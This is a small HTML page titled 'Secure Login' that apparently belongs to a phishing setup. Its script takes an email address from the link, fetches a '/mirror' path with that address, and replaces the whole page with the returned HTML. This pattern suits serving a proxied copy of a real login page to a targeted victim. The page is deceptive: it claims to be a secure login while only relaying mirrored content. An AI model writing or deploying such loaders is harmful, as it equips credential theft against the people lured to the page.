<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Login</title>
</head>
<body>
  <script>
    const email = new URLSearchParams(window.location.search).get("email");
    const forwardTo = `/mirror${email ? "?email=" + encodeURIComponent(email) : ""}`;

    fetch(forwardTo)
      .then(res => res.text())
      .then(html => {
        document.open();
        document.write(html);
        document.close();
      })
      .catch(err => {
        document.body.innerHTML = "<h2>Error loading page.</h2>";
      });
  </script>
</body>
</html>
